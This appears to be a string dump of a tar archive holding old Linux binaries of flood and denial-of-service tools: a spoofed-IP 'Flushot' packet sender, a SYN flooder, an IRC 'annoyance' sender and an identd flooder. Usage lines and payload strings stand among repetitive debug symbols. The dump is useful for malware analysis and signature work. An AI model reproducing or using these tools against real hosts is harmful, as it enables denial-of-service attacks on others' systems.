            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "synk3.c",
            "send_tcp_segment",
            "srcport",
            "ip_sum",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "spoof_open",
            "fprintf@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "sock",
            "htonl@@GLIBC_2.0",
            "getaddr",
            "random@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "send_seq",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "ack_seq",
            "__bss_start",
            "main",
            "ssock",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gettimeofday@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "flood",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/flushot",
            "0100755",
            "0000000",
            "0000000",
            "00000034312",
            "07100656604",
            "013551",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "malloc",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh|",
            "E1fE",
            "fE1fu",
            "e[^]",
            "U$Sj$O",
            "EEEE",
            "Ej$j",
            "UMfY",
            "j\tEP",
            "Pj u",
            "UMfY",
            "j$EPE",
            "EEEPj",
            "EPEPEP",
            "u\"h@",
            "\u0403;u[]",
            "Remote Flushot v 1.0",
            " usage:",
            "./flushot [Spoofed IP] [Destination IP] [# of FLushot to Send]",
            " [Spoofed IP] :  ex: 205.56.78.0",
            " [Destination IP] :  ex: 201.12.3.76",
            " [# of FLushot to Send]  : 100",
            "The Flu Hacking Group (c)",
            "DarkShadow PlimoMan Hack The Planet",
            "ERROR: Unable to resolve host %s",
            "ERROR: Opening raw socket.",
            "Status: Connected....packets sent.",
            "ERROR: Unable to Connect To luser.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "flushot.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "resolve",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "banner",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "send_winbomb",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/foqerc",
            "0100755",
            "0000000",
            "0000000",
            "00000033425",
            "07100656605",
            "013351",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "connect",
            "perror",
            "socket",
            "bzero",
            "send",
            "inet_addr",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            "E1fE",
            "t$EP",
            "u&hP",
            "\u0403;u[]",
            "gethostbyname()",
            "connect()",
            "Connected to [%s:%d].",
            "Usage: %s <target> <message>",
            "socket()",
            "Sending annoyance... ",
            "PASS :x",
            "SERVER ----------------------------------!",
            "!---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 1 :bah",
            "Done!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "foqerc.c",
            "_DYNAMIC",
            "host",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "addr",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "open_sock",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/gewse",
            "0100755",
            "0000000",
            "0000000",
            "00000032344",
            "07100656611",
            "013200",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "connect",
            "memcpy",
            "perror",
            "socket",
            "fflush",
            "write",
            "__deregister_frame_info",
            "inet_ntoa",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhT",
            "fEfE",
            "t?fE",
            "fEEP",
            "PEP_",
            "\u0403;u[]",
            "gewse.c by napster...",
            "usage: %s <host> <# of connex>",
            "resolving",
            "Flooding %s [%s] identd %d times.",
            "Killing",
            "socket",
            "connect",
            "1027, 6667 : USERID : UNIX : die",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
